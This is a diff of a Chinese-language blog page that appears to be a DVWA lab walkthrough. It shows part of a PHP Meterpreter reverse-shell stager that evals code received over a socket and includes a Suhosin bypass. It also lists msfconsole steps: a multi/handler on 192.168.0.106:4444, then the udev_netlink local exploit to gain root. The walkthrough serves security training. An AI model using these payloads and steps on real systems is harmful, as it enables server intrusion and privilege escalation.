style="color:#8be9fd;font-style:italic">$len</span>); <span style="color:#8be9fd;font-style:italic">$len</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$a</span>[<span style="color:#f1fa8c">&#39;len&#39;</span>]; <span style="color:#8be9fd;font-style:italic">$b</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>; <span style="color:#ff79c6">while</span> (strlen(<span style="color:#8be9fd;font-style:italic">$b</span>) <span style="color:#ff79c6">&lt;</span> <span style="color:#8be9fd;font-style:italic">$len</span>) { <span style="color:#ff79c6">switch</span> (<span style="color:#8be9fd;font-style:italic">$s_type</span>) { <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;stream&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">$b</span> <span style="color:#ff79c6">.=</span> fread(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#8be9fd;font-style:italic">$len</span><span style="color:#ff79c6">-</span>strlen(<span style="color:#8be9fd;font-style:italic">$b</span>)); <span style="color:#ff79c6">break</span>; <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#39;socket&#39;</span><span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">$b</span> <span style="color:#ff79c6">.=</span> socket_read(<span style="color:#8be9fd;font-style:italic">$s</span>, <span style="color:#8be9fd;font-style:italic">$len</span><span style="color:#ff79c6">-</span>strlen(<span style="color:#8be9fd;font-style:italic">$b</span>)); <span style="color:#ff79c6">break</span>; } } <span style="color:#8be9fd;font-style:italic">$GLOBALS</span>[<span style="color:#f1fa8c">&#39;msgsock&#39;</span>] <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$s</span>; <span style="color:#8be9fd;font-style:italic">$GLOBALS</span>[<span style="color:#f1fa8c">&#39;msgsock_type&#39;</span>] <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$s_type</span>; <span style="color:#ff79c6">if</span> (extension_loaded(<span style="color:#f1fa8c">&#39;suhosin&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> ini_get(<span style="color:#f1fa8c">&#39;suhosin.executor.disable_eval&#39;</span>)) { <span style="color:#8be9fd;font-style:italic">$suhosin_bypass</span><span style="color:#ff79c6">=</span>create_function(<span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#8be9fd;font-style:italic">$b</span>); <span style="color:#8be9fd;font-style:italic">$suhosin_bypass</span>(); } <span style="color:#ff79c6">else</span> { <span style="color:#ff79c6">eval</span>(<span style="color:#8be9fd;font-style:italic">$b</span>); } <span style="color:#ff79c6">die</span>();<span style="color:#ff79c6">?&gt;</span>
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&#34;utf-8&#34; /&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Hacked&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre></td></tr></table>
 </div>
 </div><p>接下来回到DVWA，在左下角点击 <strong><code>upload</code></strong> 进入上传页面，然后点击 <strong><code>选择文件</code></strong> 再点击 <strong><code>upload</code></strong> 即可。</p>
 <p>将这个文件上传进去。</p>
@@ -2478,55 +2470,55 @@ Table: users
 <p><strong><code>../../hackable/uploads/test.php succesfully uploaded!</code></strong></p>
 <p>说明你上传成功了，接下来要用到<strong>msf</strong></p>
 <p>我们在终端进入msf:</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo msfconsole
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">$ sudo msfconsole
 </code></pre></td></tr></table>
 </div>
 </div><p>不多讲了，走个命令流程，之前写过</p>
 <p>调用模块:</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/multi/handler
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">msf5 &gt; use exploit/multi/handler
 </code></pre></td></tr></table>
 </div>
 </div><p>按顺序执行:</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#666">(</span>multi/handler<span style="color:#666">)</span> &gt; <span style="color:#007020">set</span> lhost 192.168.0.106
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#ff79c6">(</span>multi/handler<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 192.168.0.106
 </code></pre></td></tr></table>
 </div>
-</div><div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#666">(</span>multi/handler<span style="color:#666">)</span> &gt; <span style="color:#007020">set</span> lport <span style="color:#40a070">4444</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#ff79c6">(</span>multi/handler<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lport <span style="color:#bd93f9">4444</span>
 </code></pre></td></tr></table>
 </div>
-</div><div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#666">(</span>multi/handler<span style="color:#666">)</span> &gt; <span style="color:#007020">set</span> payload php/meterpreter/reverse_tcp
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#ff79c6">(</span>multi/handler<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> payload php/meterpreter/reverse_tcp
 </code></pre></td></tr></table>
 </div>
-</div><div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#666">(</span>multi/handler<span style="color:#666">)</span> &gt; run
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#ff79c6">(</span>multi/handler<span style="color:#ff79c6">)</span> &gt; run
 </code></pre></td></tr></table>
 </div>
 </div><p>执行完后，如图:</p>
@@ -2542,31 +2534,31 @@ Table: users
 <p>首先把我们刚刚获取的webshell放到后台:</p>
 <pre tabindex="0"><code>meterpreter &gt; background
 </code></pre><p>然后我们使用这个模块<code>exploit/linux/local/udev_netlink</code>(用别的也可以，我个人喜欢用这个:)</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#666">(</span>multi/handler<span style="color:#666">)</span> &gt; use exploit/linux/local/udev_netlink
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#ff79c6">(</span>multi/handler<span style="color:#ff79c6">)</span> &gt; use exploit/linux/local/udev_netlink
 </code></pre></td></tr></table>
 </div>
 </div><p>模块的信息你可以自己输入 <strong><code>info</code></strong> 这个命令去查看，</p>
 <p>然后我们设置刚刚webshell的session号，我的是2:</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#666">(</span>linux/local/udev_netlink<span style="color:#666">)</span> &gt; <span style="color:#007020">set</span> SESSION <span style="color:#40a070">2</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#ff79c6">(</span>linux/local/udev_netlink<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> SESSION <span style="color:#bd93f9">2</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>最后执行 <strong><code>run</code></strong> 或者 <strong><code>exploit</code></strong> :</p>
-<div class="highlight"><div style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#666">(</span>linux/local/udev_netlink<span style="color:#666">)</span> &gt; exploit
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-bash" data-lang="bash">msf5 exploit<span style="color:#ff79c6">(</span>linux/local/udev_netlink<span style="color:#ff79c6">)</span> &gt; exploit
 </code></pre></td></tr></table>
 </div>
 </div><p>这样我们就获取到最高权限了，如图:</p>
@@ -2637,8 +2629,9 @@ Table: users
             </div>
         </div>
     </div>
-</div>
 
+
+                    </div>
             </div><div id="single-column-footer">
 Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://amazingrise.net">Rise</a>
 <br>
@@ -2651,275 +2644,7 @@ Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> b
 	
 </div>
             </div>
-    <script>
-let app;
-
-app = new Vue({
-    el: '#app',
-    data: {
-        scrollY: 0,
-        navOpacity: 0,
-        isDrawerOpen: false,
-        mounted: false,
-        isDarkMode: false
-    },
-    methods: {
-            sgn(t, x) {
-                let k = 1. / (1. - 2 * t);
-                if (x <= t) return 0;
-                else if (x >= 1 - t) return 1;
-                else {
-                    return k * (x - t);
-                }
-            },
-            handleScroll() {
-                this.scrollY = window.scrollY;
-                this.navOpacity = this.sgn(.0, Math.min(1, Math.max(0, window.scrollY / (this.pageHeadHeight() - this.navBarHeight() * 0.8))));
-                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;
-
-                if (this.navOpacity >= 1) {
-                    navBackground.style.opacity = 1;
-                    navTitle.style.opacity = 1;
-                } else {
-                    navBackground.style.opacity = 0;
-                    navTitle.style.opacity = 0;
-                }
-            },
-            handleResize() {
-                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;
-                extraContainer.style.left = (streamContainer.offsetWidth - extraContainer.offsetWidth) + 'px';
-            },
-            navBarHeight() {
-                return this.$refs.navBar.offsetHeight;
-            },
-            pageHeadHeight() {
-                return this.$refs.pageHead.offsetHeight;
-            },
-            toggleDrawer() {
-                this.isDrawerOpen = !this.isDrawerOpen;
-                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
-            },
-            closeDrawer() {
-                this.isDrawerOpen = false;
-                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
-            },
-            toggleDarkMode() {
-                this.isDarkMode = !this.isDarkMode;
-                if (this.isDarkMode==true){
-                    document.cookie = "night=1;path=/";
-                    document.body.classList.add("night");
-                } else {
-                    document.cookie = "night=0;path=/";
-                    document.body.classList.remove("night");
-                }
-            },
-            debounce(func, wait, options) {
-                let lastArgs,
-                    lastThis,
-                    maxWait,
-                    result,
-                    timerId,
-                    lastCallTime
-
-                let lastInvokeTime = 0
-                let leading = false
-                let maxing = false
-                let trailing = true
-
-                
-                const useRAF = (!wait && wait !== 0 && typeof root.requestAnimationFrame === 'function')
-
-                if (typeof func !== 'function') {
-                    throw new TypeError('Expected a function')
-                }
-                function isObject(value) {
-                    const type = typeof value
-                    return value != null && (type === 'object' || type === 'function')
-                }
-
-                wait = +wait || 0
-                if (isObject(options)) {
-                    leading = !!options.leading
-                    maxing = 'maxWait' in options
-                    maxWait = maxing ? Math.max(+options.maxWait || 0, wait) : maxWait
-                    trailing = 'trailing' in options ? !!options.trailing : trailing
-                }
-
-                function invokeFunc(time) {
-                    const args = lastArgs
-                    const thisArg = lastThis
-
-                    lastArgs = lastThis = undefined
-                    lastInvokeTime = time
-                    result = func.apply(thisArg, args)
-                    return result
-                }
-
-                function startTimer(pendingFunc, wait) {
-                    if (useRAF) {
-                    root.cancelAnimationFrame(timerId)
-                    return root.requestAnimationFrame(pendingFunc)
-                    }
-                    return setTimeout(pendingFunc, wait)
-                }
-
-                function cancelTimer(id) {
-                    if (useRAF) {
-                    return root.cancelAnimationFrame(id)
-                    }
-                    clearTimeout(id)
-                }
-
-                function leadingEdge(time) {
-                    
-                    lastInvokeTime = time
-                    
-                    timerId = startTimer(timerExpired, wait)
-                    
-                    return leading ? invokeFunc(time) : result
-                }
-
-                function remainingWait(time) {
-                    const timeSinceLastCall = time - lastCallTime
-                    const timeSinceLastInvoke = time - lastInvokeTime
-                    const timeWaiting = wait - timeSinceLastCall
-
-                    return maxing
-                    ? Math.min(timeWaiting, maxWait - timeSinceLastInvoke)
-                    : timeWaiting
-                }
-
-                function shouldInvoke(time) {
-                    const timeSinceLastCall = time - lastCallTime
-                    const timeSinceLastInvoke = time - lastInvokeTime
-
-                    
-                    
-                    
-                    return (lastCallTime === undefined || (timeSinceLastCall >= wait) ||
-                    (timeSinceLastCall < 0) || (maxing && timeSinceLastInvoke >= maxWait))
-                }
-
-                function timerExpired() {
-                    const time = Date.now()
-                    if (shouldInvoke(time)) {
-                    return trailingEdge(time)
-                    }
-                    
-                    timerId = startTimer(timerExpired, remainingWait(time))
-                }
-
-                function trailingEdge(time) {
-                    timerId = undefined
-
-                    
-                    
-                    if (trailing && lastArgs) {
-                    return invokeFunc(time)
-                    }
-                    lastArgs = lastThis = undefined
-                    return result
-                }
-
-                function cancel() {
-                    if (timerId !== undefined) {
-                    cancelTimer(timerId)
-                    }
-                    lastInvokeTime = 0
-                    lastArgs = lastCallTime = lastThis = timerId = undefined
-                }
-
-                function flush() {
-                    return timerId === undefined ? result : trailingEdge(Date.now())
-                }
-
-                function pending() {
-                    return timerId !== undefined
-                }
-
-                function debounced(...args) {
-                    const time = Date.now()
-                    const isInvoking = shouldInvoke(time)
-
-                    lastArgs = args
-                    lastThis = this
-                    lastCallTime = time
-
-                    if (isInvoking) {
-                    if (timerId === undefined) {
-                        return leadingEdge(lastCallTime)
-                    }
-                    if (maxing) {
-                        
-                        timerId = startTimer(timerExpired, wait)
-                        return invokeFunc(lastCallTime)
-                    }
-                    }
-                    if (timerId === undefined) {
-                    timerId = startTimer(timerExpired, wait)
-                    }
-                    return result
-                }
-                debounced.cancel = cancel
-                debounced.flush = flush
-                debounced.pending = pending
-                return debounced
-                }
-
-    },
-    created() {
-        window.addEventListener('scroll', this.handleScroll);
-        window.addEventListener('resize', this.handleResize);
-        window._nonDesktop = function () {
-            let check = false;
-            (function (a) {
-                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
-            })(navigator.userAgent || navigator.vendor || window.opera);
-            return check;
-        };
-        
-        var night = document.cookie.replace(/(?:(?:^|.*;\s*)night\s*\=\s*([^;]*).*$)|^.*$/, "$1");
-        if (night==""){
-            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
-                
-            }
-        }else{
-            
-            if (night=="1") {
-                this.toggleDarkMode();
-            }
-        }
-    },
-    mounted() {
-        this.handleScroll();
-        this.handleResize();
-        this.mounted = true;
-
-        
-        
-        
-
-        document.querySelectorAll("table").forEach(function(elem){
-            elem.classList.add("table-striped");
-            elem.classList.add("table");
-            elem.classList.add("table-responsive");
-            elem.classList.add("table-hover");
-        })
-
-        
-        spy();
-        window.addEventListener('scroll', this.debounce(spy, 250, { 'maxWait': 250 }), false);
-        
-        
-    },
-    destroyed() {
-        window.removeEventListener('scroll', this.handleScroll);
-        window.removeEventListener('resize', this.handleResize);
-    }
-});
-
-
-
-</script>
+    
+    <script src="/js/journal.js"></script>
     </body>
 </html>
